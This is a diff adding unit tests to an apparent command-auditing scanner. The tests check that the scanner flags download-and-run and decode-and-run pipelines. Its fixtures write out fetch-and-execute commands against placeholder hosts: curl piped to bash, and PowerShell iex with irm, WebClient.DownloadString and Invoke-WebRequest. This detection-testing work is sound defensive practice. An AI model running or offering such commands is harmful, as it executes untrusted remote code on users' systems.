@@ -102,3 +102,57 @@ test("download-and-run coexists with both original findings on a labelled shell 
     assert.deepEqual(findings.filter(f => f.code === code).map(f => f.line), [6], code);
   }
 });
+
+const scriptAddress = "https://example.invalid/s.ps1";
+const downloaded = "curl -fsSL https://example.invalid/s.sh | ";
+const decoded = "echo SU5FUlQ= | base64 -d | "; // The encoded fixture contains just INERT.
+const fixRound = [
+  ["F2a", download, downloaded + "/bin/bash", downloaded + "/usr/bin/jq"],
+  ["F2b", download, downloaded + "/usr/bin/env bash", downloaded + "envsubst"],
+  ["F2c", decode, decoded + "/bin/sh", decoded + "/bin/cat"],
+  ["F3a", download, "iex (irm " + scriptAddress + ")", "iex ($localScript)"],
+  ["F3b", download, "iex ((New-Object System.Net.WebClient).DownloadString('" + scriptAddress + "'))",
+    "iex ((New-Object System.Net.WebClient).DownloadFile('" + scriptAddress + "', 'fixture.txt'))"],
+  ["F3c", download, "Invoke-Expression (Invoke-WebRequest -Uri " + scriptAddress + ").Content",
+    'Invoke-Expression "Get-Date"'],
+];
+for (const [id, code, trigger, control] of fixRound) {
+  test(id + " reports " + code + " only on its matching input", t => {
+    assert.deepEqual(auditText(t, control), []);
+    const hits = auditText(t, "Example\n" + trigger).filter(f => f.code === code);
+    assert.deepEqual(hits.map(f => f.line), [2]);
+  });
+}
+
+test("shell paths and env work for both pipeline rules and preserve substitutions", t => {
+  for (const [source, code] of [[downloaded, download], [decoded, decode]]) {
+    for (const sink of ["/opt/tools/bin/zsh", "env sh", "/usr/bin/env /bin/bash"]) {
+      assert.ok(auditText(t, source + sink).some(f => f.code === code), sink);
+    }
+    for (const other of ["/opt/bash/cat", "/bin/sh.helper", "/usr/bin/env jq", "envsubst bash"]) {
+      assert.deepEqual(auditText(t, source + other), [], other);
+    }
+  }
+  assert.ok(auditText(t, "/bin/bash <(curl -s " + address + ")").some(f => f.code === download));
+});
+
+test("bare and absolute shell sinks keep their original prose punctuation boundaries", t => {
+  for (const suffix of ["sh!", "sh?", "sh:", "/opt/bin/sh!"]) {
+    assert.ok(auditText(t, downloaded + suffix).some(f => f.code === download), suffix);
+  }
+});
+
+test("PowerShell download evidence stays inside the same invocation on one line", t => {
+  for (const source of [
+    "irm https://example.invalid/a.json | ConvertTo-Json",
+    "iex ($localScript); irm " + scriptAddress,
+    "iex (\nirm " + scriptAddress + ")",
+    "iex (other-irm " + scriptAddress + ")",
+    "iex ('irm " + scriptAddress + "')",
+    "iex ($localScript) # .DownloadString()",
+  ]) assert.deepEqual(auditText(t, source), [], source);
+  for (const cmd of ["iwr", "Invoke-RestMethod"]) {
+    const text = "IEX((" + cmd + " 'https://example.invalid/sample(1).ps1'))";
+    assert.ok(auditText(t, text).some(f => f.code === download), cmd);
+  }
+});
